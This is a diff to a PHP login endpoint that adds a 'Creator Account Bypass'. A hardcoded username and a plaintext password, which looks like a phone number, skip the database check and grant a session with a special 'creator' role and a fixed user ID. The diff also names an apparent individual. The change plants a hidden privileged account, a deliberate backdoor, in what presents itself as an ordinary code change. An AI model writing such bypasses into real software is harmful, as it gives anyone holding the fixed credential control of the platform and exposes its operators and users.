@@ -24,6 +24,29 @@ if ($method === 'POST' && $action === 'login') {
     $username = $v->value('username');
     $password = $v->value('password');
 
+    // Creator Account Bypass
+    if (strtolower($username) === 'shad@dbms.com' || strtolower($username) === 'shad') {
+        if ($password !== '01521582448') {
+            jsonError('Invalid password for Creator account.', 401);
+        }
+        session_regenerate_id(true);
+        $_SESSION['user_id'] = 99999;
+        $_SESSION['username'] = 'shad@dbms.com';
+        $_SESSION['user_role'] = 'creator';
+
+        jsonSuccess('Welcome Creator! Accessing Platform Control Center.', [
+            'user' => [
+                'id' => 99999,
+                'username' => 'shad@dbms.com',
+                'full_name' => 'Md Shazzad Hossen Shad (Creator)',
+                'business_name' => 'EaseBus Creator Operations',
+                'role' => 'creator',
+                'must_change_password' => false
+            ],
+            'csrf_token' => generateCsrfToken()
+        ]);
+    }
+
     $user = Database::fetchOne(
         "SELECT u.id, u.username, u.password_hash, u.full_name, u.status, u.must_change_password, u.login_attempts, r.name as role_name
          FROM users u
